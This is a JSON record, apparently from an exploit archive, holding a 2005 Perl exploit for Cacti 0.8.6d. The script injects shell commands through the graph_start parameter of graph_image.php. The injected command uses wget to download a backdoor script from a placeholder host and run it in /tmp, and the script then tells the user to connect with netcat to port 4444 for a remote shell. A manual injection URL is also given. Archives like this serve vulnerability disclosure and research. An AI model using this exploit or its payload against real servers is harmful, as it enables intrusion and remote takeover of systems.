{
  "id": "1062",
  "title": "Cacti 0.8.6d - Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "# Note:\r\n# This exploit contains backdoor shell code that is not located on this server.\r\n# /str0ke \r\n\r\n#!/usr/bin/perl\r\n#\r\n# Remote Command Execution Exploit for Cacti <= 0.8.6d\r\n#\r\n# This exploit open a remote shell on the targets that uses Cacti\r\n# TARGET HOST MUST BE A GNU/LINUX SERVER, if not:\r\n# manual exploiting --> http://www.example.com/cacti/graph_image.php?local_graph_id=[valid_value]&graph_start=%0a[command]%0a\r\n# Patch: download the last version http://www.cacti.net/download_cacti.php\r\n# Discovered and Coded by Alberto Trivero\r\n\r\nuse LWP::Simple;\r\n\r\nprint \"\\n\\t===============================\\n\";\r\nprint \"\\t= Exploit for Cacti <= 0.8.6d =\\n\";\r\nprint \"\\t=      by Alberto Trivero     =\\n\";\r\nprint \"\\t===============================\\n\\n\";\r\n\r\nif(@ARGV<2 or !($ARGV[1]=~m/\\//)) {\r\n   print \"Usage:\\nperl $0 [target] [path]\\n\\nExamples:\\nperl $0 www.example.com /cacti/\\n\";\r\n   exit(0);\r\n}\r\n\r\n$page=get(\"http://\".$ARGV[0].$ARGV[1].\"graph_view.php?action=list\") || die \"[-] Unable to retrieve: $!\";\r\nprint \"[+] Connected to: $ARGV[0]\\n\";\r\n$page=~m/local_graph_id=(.*?)&/ || die \"[-] Unable to retrieve a value for local_graph_id\";\r\nprint \"[~] Sending exploiting request, wait for some seconds/minutes...\\n\";\r\nget(\"http://\".$ARGV[0].$ARGV[1].\"graph_image.php?local_graph_id=$1&graph_start=%0acd /tmp;wget http://server/shell.pl;chmod 777 shell.pl;perl shell.pl%0a\");\r\nprint \"[+] Exploiting request done!\\n\";\r\nprint \"[*] Now try on your box: nc -v $ARGV[0] 4444\\n\";\r\n\r\n# milw0rm.com [2005-06-22]",
  "url": "https://www.exploit-db.com/exploits/1062"
}